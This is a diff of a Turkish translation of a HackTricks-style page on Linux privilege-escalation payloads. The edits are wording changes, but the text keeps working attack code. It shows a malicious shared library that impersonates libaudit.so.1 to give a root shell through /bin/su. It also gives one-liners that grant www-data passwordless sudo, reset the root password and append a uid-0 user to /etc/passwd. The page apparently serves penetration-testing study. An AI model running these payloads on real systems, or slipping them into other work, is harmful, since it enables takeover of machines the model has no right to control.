@@ -1,4 +1,4 @@
-# Çalıştırılacak Payload'lar
+# Çalıştırılacak payload'lar
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -44,18 +44,18 @@ execve(paramList[0], paramList, NULL);
 return 0;
 }
 ```
-## Privilege escalation için bir dosyanın üzerine yazma
+## Yetkileri yükseltmek için bir dosyanın üzerine yazma
 
 ### Yaygın dosyalar
 
-- _/etc/passwd_ dosyasına parolalı kullanıcı ekleme
+- _/etc/passwd_ dosyasına parolası olan bir kullanıcı ekleme
 - _/etc/shadow_ içindeki parolayı değiştirme
 - _/etc/sudoers_ dosyasına sudoers kullanıcısı ekleme
-- Genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ konumunda bulunan docker socket üzerinden docker'ı kötüye kullanma
+- Genellikle _/run/docker.sock_ veya _/var/run/docker.sock_ konumlarında bulunan docker socket üzerinden docker'ı kötüye kullanma
 
-### Bir library'nin üzerine yazma
+### Bir kütüphanenin üzerine yazma
 
-Bir binary tarafından kullanılan bir library'yi kontrol edin; bu örnekte `/bin/su`:
+Bu durumda `/bin/su` olmak üzere, bazı binary'ler tarafından kullanılan bir kütüphaneyi kontrol edin:
 ```bash
 ldd /bin/su
 linux-vdso.so.1 (0x00007ffef06e9000)
@@ -67,7 +67,7 @@ libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
 libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
-Bu durumda `/lib/x86_64-linux-gnu/libaudit.so.1` kimliğine bürünmeyi deneyelim.\
+Bu durumda `/lib/x86_64-linux-gnu/libaudit.so.1` dosyasını taklit etmeyi deneyelim.\
 Bu nedenle, **`su`** binary'si tarafından kullanılan bu library'nin function'larını kontrol edin:
 ```bash
 objdump -T /bin/su | grep audit
@@ -76,7 +76,7 @@ objdump -T /bin/su | grep audit
 0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
-`audit_open`, `audit_log_acct_message`, `audit_log_acct_message` ve `audit_fd` sembolleri muhtemelen libaudit.so.1 kütüphanesindendir. libaudit.so.1 malicious shared library tarafından üzerine yazılacağından, bu semboller yeni shared library içinde bulunmalıdır; aksi takdirde program sembolü bulamaz ve sonlanır.
+`audit_open`, `audit_log_acct_message`, `audit_log_acct_message` ve `audit_fd` sembolleri muhtemelen libaudit.so.1 library'sindendir. libaudit.so.1 malicious shared library tarafından üzerine yazılacağından, bu semboller yeni shared library içinde bulunmalıdır; aksi takdirde program sembolü bulamayacak ve çıkacaktır.
 ```c
 #include<stdio.h>
 #include<stdlib.h>
@@ -98,21 +98,21 @@ setgid(0);
 system("/bin/bash");
 }
 ```
-Şimdi yalnızca **`/bin/su`** çağırarak root olarak bir shell elde edebilirsiniz.
+Şimdi yalnızca **`/bin/su`** çağırarak root olarak bir shell elde edersiniz.
 
-## Scripts
+## Script'ler
 
-root'a bir şey çalıştırabilir misiniz?
+Root'a bir şey çalıştırmasını sağlayabilir misiniz?
 
 ### **www-data to sudoers**
 ```bash
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
-### **root parolasını değiştir**
+### **root parolasını değiştirme**
 ```bash
 echo "root:hacked" | chpasswd
 ```
-### /etc/passwd Dosyasına Yeni root Kullanıcısı Ekleme
+### /etc/passwd'e yeni root kullanıcısı ekleme
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
 ```
